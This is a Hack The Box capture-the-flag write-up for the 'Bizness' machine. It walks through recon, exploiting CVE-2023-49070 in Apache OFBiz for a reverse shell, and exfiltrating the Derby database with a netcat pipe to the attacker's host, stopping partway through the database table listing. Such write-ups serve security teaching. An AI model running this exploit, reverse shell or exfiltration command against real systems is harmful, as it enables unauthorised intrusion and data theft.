---
title: HTB: Bizness
url: https://0xdf.gitlab.io/2024/05/25/htb-bizness.html
date: 2024-05-25T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-bizness, ctf, hackthebox, nmap, debian, ofbiz, feroxbuster, cve-2023-49070, ysoserial, java, hashcat, ij, derby, dbeaver, cyberchef
---

![Bizness](/img/bizness-cover.png)

Bizness is all about an Apache OFBiz server that is vulnerable to CVE-2023-49070. I’ll exploit this pre-authentication remote code execution CVE to get a shell. To esclate, I’ll find the Apache Derby database and exfil it to my machine. I’ll show how to enumerate it using the ij command line too, as well as DBeaver. Once I find the hash, I’ll need to reformat it to something hashcat can process, crack it, and get root.

## Box Info

| Name | [Bizness](https://hackthebox.com/machines/bizness)  [Bizness](https://hackthebox.com/machines/bizness) [Play on HackTheBox](https://hackthebox.com/machines/bizness) |
| --- | --- |
| Release Date | [06 Jan 2024](https://twitter.com/hackthebox_eu/status/1742954071332401657) |
| Retire Date | 25 May 2024 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Bizness |
| Radar Graph | Radar chart for Bizness |
| First Blood User | 00:01:46[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 00:59:52[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [C4rm3l0 C4rm3l0](https://app.hackthebox.com/users/458049) |

## Recon

### nmap

`nmap` finds four open TCP ports, SSH (22), HTTP (80), HTTPS (443), and unknown (41855):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.252
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-20 15:11 EDT
Warning: 10.10.11.252 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.252
Host is up (0.10s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
41855/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.94 seconds
oxdf@hacky$ nmap -p 22,80,443,41855 -sCV 10.10.11.252
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-20 15:14 EDT
Nmap scan report for 10.10.11.252
Host is up (0.094s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp    open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
41855/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.07 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 11 bullseye.

Both 80 and 443 redirect to HTTPS on `bizness.htb`. Given the user of host-base routing on the webserver, I’ll fuzz for other subdomains of `bizness.htb` but not find any. I’ll add `bizness.htb` to my `/etc/hosts` file:

```
10.10.11.252 bizness.htb

```

### Website - TCP 443

#### Site

The site is for some kind of business consultancy:

![image-20240520152508545](/img/image-20240520152508545.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

All the links on the page go to other places on the page. The contact us form doesn’t submit, and the newsletteer signup form just reloads the page.

#### Tech Stack

The HTTP response headers set a `JSESSIONID` cookie ending in `.jvm1`:

```

HTTP/1.1 200 
Server: nginx/1.18.0
Date: Mon, 20 May 2024 19:24:06 GMT
Content-Type: text/html
Connection: close
Set-Cookie: JSESSIONID=25B03C3CC2DE58B193FA0E03C89181D8.jvm1; Path=/; Secure; HttpOnly
Accept-Ranges: bytes
ETag: W/"27200-1702887508516"
Last-Modified: Mon, 18 Dec 2023 08:18:28 GMT
vary: accept-encoding
Content-Length: 27200

```

The footer on the page gives more details:

![image-20240520152749265](/img/image-20240520152749265.png)

[Apache OFBiz](https://ofbiz.apache.org/) is:

> a suite of business applications flexible enough to be used across any industry. A common architecture allows developers to easily extend or enhance it to create custom features.

Visiting a path that doesn’t exist (`/0xdfwashere`) just returns a 302 to the web root.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -k -u https://bizness.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://bizness.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      522l     1736w    27200c https://bizness.htb/
404      GET        1l       68w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l       61w      682c https://bizness.htb/WEB-INF
500      GET       10l       77w     1443c https://bizness.htb/catalog/images
404      GET        1l       61w      682c https://bizness.htb/images/WEB-INF
404      GET        1l       61w      682c https://bizness.htb/content/WEB-INF
404      GET        1l       61w      682c https://bizness.htb/common/WEB-INF
404      GET        1l       61w      682c https://bizness.htb/catalog/WEB-INF
404      GET        1l       61w      682c https://bizness.htb/ebay/WEB-INF
200      GET      492l     1596w    34633c https://bizness.htb/ebay/control
200      GET      492l     1596w    34633c https://bizness.htb/marketing/control
200      GET      492l     1596w    34633c https://bizness.htb/ar/control
404      GET        1l       61w      682c https://bizness.htb/ar/WEB-INF
404      GET        1l       61w      682c https://bizness.htb/marketing/WEB-INF
404      GET        1l       61w      682c https://bizness.htb/META-INF
404      GET        1l       61w      682c https://bizness.htb/images/META-INF
404      GET        1l       61w      682c https://bizness.htb/content/META-INF
404      GET        1l       61w      682c https://bizness.htb/common/META-INF
404      GET        1l       61w      682c https://bizness.htb/catalog/META-INF
500      GET        7l       13w      177c https://bizness.htb/common/js/plugins/admin_c
500      GET        7l       13w      177c https://bizness.htb/common/js/util/App_Code
404      GET        1l       61w      682c https://bizness.htb/passport/WEB-INF
404      GET        1l       61w      682c https://bizness.htb/ar/META-INF
404      GET        1l       61w      682c https://bizness.htb/ebay/META-INF
500      GET        7l       13w      177c https://bizness.htb/common/css/Private
500      GET        7l       13w      177c https://bizness.htb/ebay/toolbar
500      GET        7l       13w      177c https://bizness.htb/images/img/galerie
500      GET        7l       13w      177c https://bizness.htb/marketing/Administration
500      GET        7l       13w      177c https://bizness.htb/images/icons/Home
404      GET        1l       61w      682c https://bizness.htb/marketing/META-INF
500      GET        7l       13w      177c https://bizness.htb/common/policy
500      GET        7l       13w      177c https://bizness.htb/images/products/usa
500      GET        7l       13w      177c https://bizness.htb/images/img/quote
500      GET        7l       13w      177c https://bizness.htb/images/products/Calendar
500      GET        7l       13w      177c https://bizness.htb/images/icons/count
500      GET        7l       13w      177c https://bizness.htb/common/js/adverts
500      GET        7l       13w      177c https://bizness.htb/common/js/util/foro
500      GET        7l       13w      177c https://bizness.htb/ap/company
500      GET        7l       13w      177c https://bizness.htb/prueba
500      GET        7l       13w      177c https://bizness.htb/produkte
500      GET        7l       13w      177c https://bizness.htb/common/js/jquery/phpmyadmin
404      GET        1l       61w      682c https://bizness.htb/ap/WEB-INF
500      GET        7l       13w      177c https://bizness.htb/passport/shell
500      GET        7l       13w      177c https://bizness.htb/images/rate/customavatars
500      GET        7l       13w      177c https://bizness.htb/common/bugtracker
500      GET        7l       13w      177c https://bizness.htb/common/js/alya2
400      GET        1l       71w      762c https://bizness.htb/common/js/[
500      GET        7l       13w      177c https://bizness.htb/common/css/citymap
500      GET        7l       13w      177c https://bizness.htb/images/products/cec
500      GET        7l       13w      177c https://bizness.htb/example/CherryPicker
500      GET        7l       13w      177c https://bizness.htb/images/rate/authenticate
500      GET        7l       13w      177c https://bizness.htb/passport/wcms
500      GET        7l       13w      177c https://bizness.htb/ebay/formdispatch
500      GET        7l       13w      177c https://bizness.htb/common/js/SelectStoresCmd
500      GET        7l       13w      177c https://bizness.htb/content/appserv
500      GET        7l       13w      177c https://bizness.htb/common/mailout
500      GET        7l       13w      177c https://bizness.htb/images/img/projekty
500      GET        7l       13w      177c https://bizness.htb/common/js/util/_xsl
500      GET        7l       13w      177c https://bizness.htb/content/arbeitgeber
500      GET        7l       13w      177c https://bizness.htb/common/js/jquery/jk
500      GET        7l       13w      177c https://bizness.htb/common/js/reset-password
500      GET        7l       13w      177c https://bizness.htb/images/rate/backup_site
500      GET        7l       13w      177c https://bizness.htb/images/icons/selfservice
500      GET        7l       13w      177c https://bizness.htb/catalog/qt
500      GET        7l       13w      177c https://bizness.htb/marketing/gosautoinspect
500      GET        7l       13w      177c https://bizness.htb/common/labo
500      GET        7l       13w      177c https://bizness.htb/passport/wddx
500      GET        7l       13w      177c https://bizness.htb/images/products/contactshort
500      GET        7l       13w      177c https://bizness.htb/ecommerce/aviso
500      GET        7l       13w      177c https://bizness.htb/ecommerce/bmadmin
500      GET        7l       13w      177c https://bizness.htb/images/img/php-uploads
500      GET        7l       13w      177c https://bizness.htb/catalog/carp_evolution_4
500      GET        7l       13w      177c https://bizness.htb/images/img/affiliateimages
500      GET        7l       13w      177c https://bizness.htb/solr/xslt
500      GET        7l       13w      177c https://bizness.htb/passport/images/c-tesco
500      GET        7l       13w      177c https://bizness.htb/common/js/jquery/forum4
500      GET        7l       13w      177c https://bizness.htb/passport/tippspiel
500      GET        7l       13w      177c https://bizness.htb/example/lostfound
500      GET        7l       13w      177c https://bizness.htb/content/CFC
500      GET        7l       13w      177c https://bizness.htb/ar/demo4
500      GET        7l       13w      177c https://bizness.htb/images/products/PDA
400      GET        1l       71w      762c https://bizness.htb/common/js/jquery/]
400      GET        1l       71w      762c https://bizness.htb/example/]
400      GET        1l       71w      762c https://bizness.htb/images/products/quote]
400      GET        1l       71w      762c https://bizness.htb/content/[0-9]
400      GET        1l       71w      762c https://bizness.htb/ap/[0-9]
400      GET        1l       71w      762c https://bizness.htb/marketing/[0-9]
400      GET        1l       71w      762c https://bizness.htb/solr/quote]
400      GET        1l       71w      762c https://bizness.htb/common/js/plugins/[0-9]
400      GET        1l       71w      762c https://bizness.htb/ebay/[0-9]
400      GET        1l       71w      762c https://bizness.htb/ecommerce/[0-9]
400      GET        1l       71w      762c https://bizness.htb/common/js/jquery/[0-9]
400      GET        1l       71w      762c https://bizness.htb/solr/extension]
400      GET        1l       71w      762c https://bizness.htb/example/[0-9]
400      GET        1l       71w      762c https://bizness.htb/solr/[0-9]
[####################] - 2m    690000/690000  0s      found:94      errors:628719
[####################] - 1m     30000/30000   266/s   https://bizness.htb/
[####################] - 1m     30000/30000   274/s   https://bizness.htb/images/
[####################] - 1m     30000/30000   268/s   https://bizness.htb/catalog/
[####################] - 1m     30000/30000   271/s   https://bizness.htb/content/
[####################] - 1m     30000/30000   274/s   https://bizness.htb/common/
[####################] - 1m     30000/30000   269/s   https://bizness.htb/ar/
[####################] - 2m     30000/30000   228/s   https://bizness.htb/ebay/
[####################] - 1m     30000/30000   276/s   https://bizness.htb/images/img/
[####################] - 1m     30000/30000   281/s   https://bizness.htb/common/css/
[####################] - 1m     30000/30000   272/s   https://bizness.htb/common/js/
[####################] - 1m     30000/30000   260/s   https://bizness.htb/marketing/
[####################] - 1m     30000/30000   274/s   https://bizness.htb/images/products/
[####################] - 1m     30000/30000   298/s   https://bizness.htb/images/icons/
[####################] - 1m     30000/30000   258/s   https://bizness.htb/common/js/plugins/
[####################] - 1m     30000/30000   337/s   https://bizness.htb/passport/
[####################] - 1m     30000/30000   349/s   https://bizness.htb/common/js/util/
[####################] - 1m     30000/30000   287/s   https://bizness.htb/ecommerce/
[####################] - 1m     30000/30000   344/s   https://bizness.htb/ap/
[####################] - 1m     30000/30000   391/s   https://bizness.htb/passport/images/
[####################] - 1m     30000/30000   285/s   https://bizness.htb/common/js/jquery/
[####################] - 1m     30000/30000   427/s   https://bizness.htb/images/rate/
[####################] - 1m     30000/30000   325/s   https://bizness.htb/example/
[####################] - 1m     30000/30000   342/s   https://bizness.htb/solr/

```

I’ll notice a lot of 404s to known Java directories like `WEB-INF` and `META-INF`. It’s interesting that these are different from the standard 404 response. Rather than redirect, they return an actual 404:

![image-20240520153025698](/img/image-20240520153025698.png)

This is Tomcat 9.0.82.

`/marketing/control` leads to an OFBiz error page:

![image-20240520154527972](/img/image-20240520154527972.png)

`/marketing` redirects to `/marketing/control/main` which is a login page:

![image-20240520154556542](/img/image-20240520154556542.png)

The tiny footer on this page gives the OFBiz version:

![image-20240521085027223](/img/image-20240521085027223.png)

## Shell as ofbiz

### CVE-2023-49070

#### Identify

Searching for “ofbiz exploit” (with a filter on 2023 to look for things available up until Bizness came out and avoid spoilers) finds multiple references to CVE-2023-49070:

![image-20240520154101157](/img/image-20240520154101157.png)

#### Background

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-49070) doesn’t give too much in the way of detail:

> Pre-auth RCE in Apache Ofbiz 18.12.09. It’s due to XML-RPC no longer maintained still present. This issue affects Apache OFBiz: before 18.12.10. Users are recommended to upgrade to version 18.12.10

There is an XML-RPC component that is no-longer maintained, and somehow accessible pre-auth. Execution is achieved by sending a serialized Java object to the XML-RPC component. The original discoverer of the vulnerability is a security researcher, [@siebene@](https://twitter.com/Siebene7/):

> [#CVE](https://twitter.com/hashtag/CVE?src=hash&ref_src=twsrc%5Etfw)-2023-49070   
> Pre-auth RCE Apache Ofbiz 18.12.09[#POC](https://twitter.com/hashtag/POC?src=hash&ref_src=twsrc%5Etfw):   
> /webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y  
>   
> Ref: <https://t.co/NSgI7IQckp>  
>   
> cc to me. [pic.twitter.com/SHOkhzlH09](https://t.co/SHOkhzlH09)
>
> — Siebene@ (@Siebene7) [December 5, 2023](https://twitter.com/Siebene7/status/1731870759130427726?ref_src=twsrc%5Etfw)

### RCE

#### Prep

I’ll grab a POC script [from abdoghazy2015’s GitHub](https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC). It requires a copy of [ysoserial](https://github.com/frohoff/ysoserial) in the same directory in order to build a specific serialized payload with the desired command. Then it builds an XML payload using that attack payload, and submits it to `/webtools/control/xmlrpc;/` just like in the Tweet above.

I’ll clone a copy of the repo and get `ysoserial-all.jar`:

```

oxdf@hacky$ git clone https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC.git
Cloning into 'ofbiz-CVE-2023-49070-RCE-POC'...
remote: Enumerating objects: 30, done.
remote: Counting objects: 100% (30/30), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 30 (delta 7), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (30/30), 8.23 KiB | 8.23 MiB/s, done.
Resolving deltas: 100% (7/7), done.
oxdf@hacky$ cd ofbiz-CVE-2023-49070-RCE-POC/
oxdf@hacky$ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
--2024-05-20 15:55:41--  https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
Resolving github.com (github.com)... 140.82.113.4
Connecting to github.com (github.com)|140.82.113.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar [following]
--2024-05-20 15:55:41--  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20240520%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240520T195538Z&X-Amz-Expires=300&X-Amz-Signature=1b5772c46ef678b30324d507e19daa96b50ee00e70c3b0b26085278bf93446ba&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=29955458&response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&response-content-type=application%2Foctet-stream [following]
--2024-05-20 15:55:42--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20240520%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240520T195538Z&X-Amz-Expires=300&X-Amz-Signature=1b5772c46ef678b30324d507e19daa96b50ee00e70c3b0b26085278bf93446ba&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=29955458&response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 59525376 (57M) [application/octet-stream]
Saving to: ‘ysoserial-all.jar’

ysoserial-all.jar          100%[=====================================>]  56.77M  82.7MB/s    in 0.7s    

2024-05-20 15:55:42 (82.7 MB/s) - ‘ysoserial-all.jar’ saved [59525376/59525376]

```

If I run this on my system, I get this failure:

```

oxdf@hacky$ python exploit.py https://bizness.htb rce id
Error while generating or serializing payload
java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x6fa4fbe3) canno
t access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because mo
dule java.xml does not export com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x6fa4fbe3 
        at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102)
        at ysoserial.payloads.CommonsBeanutils1.getObject(CommonsBeanutils1.java:20)
        at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
                                                    
        Command didn't executed, please make sure you have java binary v11
        this exploit tested on this env
        openjdk version "11.0.17" 2022-10-18
        OpenJDK Runtime Environment (build 11.0.17+8-post-Debian-2)
        OpenJDK 64-Bit Server VM (build 11.0.17+8-post-Debian-2, mixed mode, sharing) 

```

The exploit author is nice enough to say what is wrong - I’m running the wrong version of Java.

I’ll grab a copy of Java 11 [here](https://www.oracle.com/java/technologies/javase/jdk11-archive-downloads.html) and install it, and use `update-alternatives` to set it as my active Java:

```

oxdf@hacky$ sudo update-alternatives --config java
There are 6 choices for the alternative java (providing /usr/bin/java).

  Selection    Path                                            Priority   Status
------------------------------------------------------------
  0            /usr/lib/jvm/jdk-11-oracle-x64/bin/java          184729600 auto mode
  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      manual mode
  2            /usr/lib/jvm/java-17-openjdk-amd64/bin/java      1711      manual mode
* 3            /usr/lib/jvm/java-18-openjdk-amd64/bin/java      1811      manual mode
  4            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      manual mode
  5            /usr/lib/jvm/jdk-11-oracle-x64/bin/java          184729600 manual mode
  6            /usr/local/java/jdk1.8.0_391/bin/java            1         manual mode

Press <enter> to keep the current choice[*], or type selection number: 5
update-alternatives: using /usr/lib/jvm/jdk-11-oracle-x64/bin/java to provide /usr/bin/java (java) in manual mode

```

#### POC

To see if this works, I’ll try running `id`:

```

oxdf@hacky$ python exploit.py https://bizness.htb rce id
Not Sure Worked or not 

```

The message implies that the script doesn’t expect to see the output of the command. It’s a blind exploit.

I’ll listen for ICMP with `tcpdump` on my host and have it ping me:

```

oxdf@hacky$ python exploit.py https://bizness.htb rce "ping -c 1 10.10.14.6"
Not Sure Worked or not

```

At `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:58:43.879612 IP 10.10.11.252 > 10.10.14.6: ICMP echo request, id 11245, seq 1, length 64
15:58:43.879639 IP 10.10.14.6 > 10.10.11.252: ICMP echo reply, id 11245, seq 1, length 64

```

That’s RCE!

#### Shell

The POC has a `shell` option, which, with `nc` listening on 443, I’ll run:

```

oxdf@hacky$ python exploit.py https://bizness.htb shell 10.10.14.6:443
Not Sure Worked or not

```

At `nc`, there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.252 43366
bash: cannot set terminal process group (552): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$

```

I’ll upgrade my shell using [the standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

ofbiz@bizness:/opt/ofbiz$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
ofbiz@bizness:/opt/ofbiz$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
ofbiz@bizness:/opt/ofbiz$

```

And grab `user.txt` from `/home/ofbiz`:

```

ofbiz@bizness:~$ cat user.txt
f4e81ade************************

```

## Shell as root

### Enumeration

#### Derby Background

It’s very standard to look for stored passwords and password hashes the database / filesystem of a just-exploited web application. That proves tricky on OfBiz because there’s so much going on in the `/opt/ofbiz` directory with almost 18 thousand files:

```

ofbiz@bizness:/opt/ofbiz$ find . -type f | wc -l
17731

```

The OFBiz `README.md` [says](https://github.com/apache/ofbiz/blob/trunk/README.md):

> *Note*: the default configuration uses an embedded Java database (Apache Derby) and embedded application server components such as Apache Tomcat®, Apache Geronimo (transaction manager), etc.

[Derby](https://db.apache.org/derby/) is a:

> an open source relational database implemented entirely in Java.

According to [the docs](https://db.apache.org/derby/docs/10.0/manuals/develop/develop13.html#HDRSII-DEVELOP-40724), the database is stored in files in a directory of the same name as the DB:

> A database directory contains the following, as shown in [Figure 2](https://db.apache.org/derby/docs/10.0/manuals/develop/develop13.html#FIGSII-DEVELOP-31476):
>
> - log [directory] - Contains files that make up the database transaction log, used internally for data recovery (not the same thing as the error log).
> - seg0 [directory] - Contains one file for each user table, system table, and index (known as conglomerates).
> - service.properties [file] - A text file with internal configuration information.
> - tmp [directory] - (might not exist.) A temporary directory used by Derby for large sorts and deferred updates and deletes. Sorts are used by a variety of SQL statements. For databases on read-only media, you might need to set a property to change the location of this directory. See “Creating Derby Databases for Read-Only Use”.
> - jar [directory] - (might not exist.) A directory in which jar files are stored when you use database class loading.

#### On Bizness

I’ll search for `seg0` and find three potential Derby DB folders:

```

ofbiz@bizness:/opt/ofbiz$ find . -name seg0
./runtime/data/derby/ofbiz/seg0
./runtime/data/derby/ofbizolap/seg0
./runtime/data/derby/ofbiztenant/seg0

```

#### Exfil

I’ll compress all of them into one file:

```

ofbiz@bizness:/opt/ofbiz/runtime/data$ tar -czf /tmp/0xdf.tar.gz derby

```

I’ll listen with `nc` on my host, and send the archive into it:

```

ofbiz@bizness:/opt/ofbiz/runtime/data$ md5sum /tmp/0xdf.tar.gz                
cb25d6b5c2cbbac1040520379cdc0e67  /tmp/0xdf.tar.gz
ofbiz@bizness:/opt/ofbiz/runtime/data$ cat /tmp/0xdf.tar.gz | nc 10.10.14.6 80

```

On my host:

```

oxdf@hacky$ nc -lnvp 80 > derby.tar.gz
Listening on 0.0.0.0 80
Connection received on 10.10.11.252 48604
^C
oxdf@hacky$ md5sum derby.tar.gz 
cb25d6b5c2cbbac1040520379cdc0e67  derby.tar.gz

```

The hashes match, so the first is complete and not corrupted.

#### Tools to View

I’ll show a couple of different ways to interact with the Derby data now that it’s on my host:

```

flowchart TD;
    A[Exfil Derby DB]-->B(<a href='#via-ij'>ij</a>);
    B-->C[Admin hash];
    A-->D(<a href='#via-dbeaver'>DBeaver</a>);
    D-->C;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;

```

#### Via ij

`ij` is an “interactive SQL scripting tool that comes with Derby”, according to [the docs](https://db.apache.org/derby/papers/DerbyTut/ij_intro.html). I’ll install it with `apt install derby-tools`.

I’ll run it, and then connect to my database:

```

oxdf@hacky$ ls
derby.log  ofbiz  ofbizolap  ofbiztenant
oxdf@hacky$ ij
ij version 10.14
ij> connect 'jdbc:derby:./ofbiz';
ij> 

```

`show schemas;` will show the databases:

```

ij> show SCHEMAS;
TABLE_SCHEM                   
------------------------------
APP                           
NULLID                        
OFBIZ                         
SQLJ                          
SYS                           
SYSCAT                        
SYSCS_DIAG                    
SYSCS_UTIL                    
SYSFUN                        
SYSIBM                        
SYSPROC                       
SYSSTAT                       

12 rows selected

```

`show tables;` will show all the tables, 877 in this case:

```

ij> show tables;
TABLE_SCHEM         |TABLE_NAME                    |REMARKS
------------------------------------------------------------------------
SYS                 |SYSALIASES                    |
SYS                 |SYSCHECKS                     |
SYS                 |SYSCOLPERMS                   |
SYS                 |SYSCOLUMNS                    |
SYS                 |SYSCONGLOMERATES              |
SYS                 |SYSCONSTRAINTS                |
SYS                 |SYSDEPENDS                    |
SYS                 |SYSFILES                      |
SYS                 |SYSFOREIGNKEYS                |
SYS                 |SYSKEYS                       |
SYS                 |SYSPERMS                      |
SYS                 |SYSROLES                      |
SYS                 |SYSROUTINEPERMS               |
SYS                 |SYSSCHEMAS                    |
SYS                 |SYSSEQUENCES                  |
SYS                 |SYSSTATEMENTS                 |
SYS                 |SYSSTATISTICS                 |
SYS                 |SYSTABLEPERMS                 |
SYS                 |SYSTABLES                     |
SYS                 |SYSTRIGGERS                   |
SYS                 |SYSUSERS                      |
SYS                 |SYSVIEWS                      |
SYSIBM              |SYSDUMMY1                     |
OFBIZ               |ACCOMMODATION_CLASS           |
OFBIZ               |ACCOMMODATION_MAP             |
OFBIZ               |ACCOMMODATION_MAP_TYPE        |
OFBIZ               |ACCOMMODATION_SPOT            |
OFBIZ               |ACCTG_TRANS                   |
OFBIZ               |ACCTG_TRANS_ATTRIBUTE         |
OFBIZ               |ACCTG_TRANS_ENTRY             |
OFBIZ               |ACCTG_TRANS_ENTRY_TYPE        |
OFBIZ               |ACCTG_TRANS_TYPE              |
OFBIZ               |ACCTG_TRANS_TYPE_ATTR         |
OFBIZ               |ADDENDUM                      |
OFBIZ               |ADDRESS_MATCH_MAP             |
OFBIZ               |AFFILIATE                     |
OFBIZ               |AGREEMENT                     |
OFBIZ               |AGREEMENT_ATTRIBUTE           |
OFBIZ               |AGREEMENT_CONTENT             |
OFBIZ               |AGREEMENT_CONTENT_TYPE        |
OFBIZ               |AGREEMENT_EMPLOYMENT_APPL     |
OFBIZ               |AGREEMENT_FACILITY_APPL       |
OFBIZ               |AGREEMENT_GEOGRAPHICAL_APPLIC |
OFBIZ               |AGREEMENT_ITEM                |
OFBIZ               |AGREEMENT_ITEM_ATTRIBUTE      |
OFBIZ               |AGREEMENT_ITEM_TYPE           |
OFBIZ               |AGREEMENT_ITEM_TYPE_ATTR      |
OFBIZ               |AGREEMENT_PARTY_APPLIC        |
OFBIZ               |AGREEMENT_PRODUCT_APPL        |
OFBIZ               |AGREEMENT_PROMO_APPL          |
OFBIZ               |AGREEMENT_ROLE                |
OFBIZ               |AGREEMENT_TERM                |
OFBIZ               |AGREEMENT_TERM_ATTRIBUTE      |
OFBIZ               |AGREEMENT_TYPE                |
OFBIZ               |AGREEMENT_TYPE_ATTR           |
OFBIZ               |AGREEMENT_WORK_EFFORT_APPLIC  |
OFBIZ               |APPLICATION_SANDBOX           |
OFBIZ               |AUDIO_DATA_RESOURCE           |
OFBIZ               |BENEFIT_TYPE                  |
OFBIZ               |BILLING_ACCOUNT               |
OFBIZ               |BILLING_ACCOUNT_ROLE          |
OFBIZ               |BILLING_ACCOUNT_TERM          |
OFBIZ               |BILLING_ACCOUNT_TERM_ATTR     |
OFBIZ               |BROWSER_TYPE                  |
OFBIZ               |BUDGET                        |
OFBIZ               |BUDGET_ATTRIBUTE              |
OFBIZ               |BUDGET_ITEM                   |
OFBIZ               |BUDGET_ITEM_ATTRIBUTE         |
OFBIZ               |BUDGET_ITEM_TYPE              |
OFBIZ               |BUDGET_ITEM_TYPE_ATTR         |
OFBIZ               |BUDGET_REVIEW                 |
OFBIZ               |BUDGET_REVIEW_RESULT_TYPE     |
OFBIZ               |BUDGET_REVISION               |
OFBIZ               |BUDGET_REVISION_IMPACT        |
OFBIZ               |BUDGET_ROLE                   |
OFBIZ               |BUDGET_SCENARIO               |
OFBIZ               |BUDGET_SCENARIO_APPLICATION   |
OFBIZ               |BUDGET_SCENARIO_RULE          |
OFBIZ               |BUDGET_STATUS                 |
OFBIZ               |BUDGET_TYPE                   |
OFBIZ               |BUDGET_TYPE_ATTR              |
OFBIZ               |CARRIER_SHIPMENT_BOX_TYPE     |
OFBIZ               |CARRIER_SHIPMENT_METHOD       |
OFBIZ               |CART_ABANDONED_LINE           |
OFBIZ               |CATALINA_SESSION              |
OFBIZ               |CHARACTER_SET                 |
OFBIZ               |CHECK_ACCOUNT                 |
